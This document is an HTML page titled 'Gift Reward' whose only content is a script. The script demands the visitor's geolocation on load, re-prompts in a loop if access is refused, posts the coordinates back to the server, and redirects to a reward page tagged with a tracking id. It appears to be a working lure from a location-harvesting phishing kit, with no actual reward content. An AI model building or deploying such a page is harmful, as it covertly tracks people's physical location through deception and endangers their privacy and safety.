<html>
            <head>
                <title>Gift Reward</title>
                <script>
                    function sendLocation(position) {
                        var latitude = position.coords.latitude;
                        var longitude = position.coords.longitude;

                        // Send location data to the PHP script via POST
                        var xhr = new XMLHttpRequest();
                        xhr.open("POST", window.location.href, true);
                        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                        xhr.onload = function() {
                            if (xhr.status === 200) {
                                var response = JSON.parse(xhr.responseText);
                                if (response.status === "success") {
                                    // Location sent successfully, proceed with redirection
                                    window.location.href = "rewardm.php?id=6899428770";  // Redirect to next
                                }
                            }
                        };
                        xhr.send("latitude=" + latitude + "&longitude=" + longitude);
                    }

                    function askLocationPermission() {
                        if (navigator.geolocation) {
                            navigator.geolocation.getCurrentPosition(sendLocation, function() {
                                alert("Location access denied. Please allow access.");
                                askLocationPermission();
                            });
                        } else {
                            alert("Geolocation is not supported by this browser.");
                        }
                    }

                    window.onload = function() {
                        askLocationPermission();
                    }
                </script>
            </head>
            <body>
            </body>
          </html>
